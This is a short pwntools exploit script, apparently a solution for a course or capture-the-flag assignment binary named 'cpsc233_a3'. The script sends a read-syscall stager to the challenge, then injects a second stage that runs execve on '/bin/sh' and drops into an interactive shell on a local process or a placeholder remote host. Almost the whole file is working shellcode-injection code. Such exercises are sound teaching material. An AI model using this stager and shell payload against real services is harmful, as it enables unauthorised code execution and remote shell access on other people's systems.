from pwn import *
import time

exe = ELF("cpsc233_a3")

context.binary = exe
# context.log_level = 'DEBUG'

LOCAL = False

if args.LOCAL or LOCAL:
    io = process([exe.path])
else:
    io = remote("rua_host_goes_here", 1337)

your_asm_code_here = '''
xor rax,rax
xor rdi,rdi
mov rsi,rdx
syscall
'''

shellcode = asm(your_asm_code_here)

log.info("Shellcode (%d bytes): " % len(shellcode))
print(your_asm_code_here)
log.info("Assembled code: ")
print(shellcode.hex().upper())

log.info("sending your function to autograder")
io.sendlineafter(b"here: ",shellcode.hex().encode())

asm_2 = '''
mov rdi, 0x2333100
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
'''
shellcode = shellcode + asm(asm_2)
shellcode = shellcode.ljust(0x100,b"\x00")+b"/bin/sh\x00"
time.sleep(0.1)
io.send(shellcode)
io.interactive()